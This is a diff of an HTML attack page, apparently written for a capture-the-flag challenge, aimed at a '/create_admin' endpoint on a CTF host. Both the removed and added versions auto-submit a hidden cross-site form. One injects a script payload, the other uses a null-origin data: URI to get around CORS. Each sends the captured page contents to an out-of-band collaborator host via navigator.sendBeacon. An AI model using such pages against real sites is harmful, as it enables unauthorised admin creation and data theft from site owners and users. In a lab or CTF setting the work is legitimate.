@@ -1,32 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="n" sandbox="allow-scripts allow-forms" style="display:none"></iframe>
+<iframe id="n" style="display:none"></iframe>
 <script>
-const inner = `
-  <!DOCTYPE html>
-  <html>
-  <body>
-  <form id="p" action="https://tasks.goidactf.ru:20431/create_admin" method="POST">
-    <input type="hidden" name="new_admin_login" value="<script>parent.postMessage({type:'xss',data:document.body.innerHTML},'*')<\/script>">
-  </form>
-  <script>
-    document.getElementById('p').submit();
-  <\/script>
-  </body>
-  </html>
-`;
-document.getElementById('n').srcdoc = inner;
+const TARGET = 'https://tasks.goidactf.ru:20431';
+const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-window.addEventListener("message", e => {
-  if (e.data && e.data.type === 'xss') {
-    // XSS сработала! Получили ответ сервера
-    navigator.sendBeacon(
-      "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/xss_capture",
-      e.data.data.substring(0, 2000)
-    );
-  }
-});
+// data: URI имеет origin null - может обходить CORS
+const dataUri = 'data:text/html,<!DOCTYPE html><html><body>' +
+  '<form id="f" action="' + TARGET + '/create_admin" method="POST">' +
+  '<input name="new_admin_login" value="NULL_ORIGIN_TEST">' +
+  '</form>' +
+  '<script>' +
+  'document.getElementById("f").submit();' +
+  'setTimeout(function() {' +
+  '  navigator.sendBeacon("' + COLLAB + '/null_origin", document.body.innerHTML);' +
+  '}, 2000);' +
+  '</script></body></html>';
+
+document.getElementById('n').src = dataUri;
 </script>
 </body>
 </html>
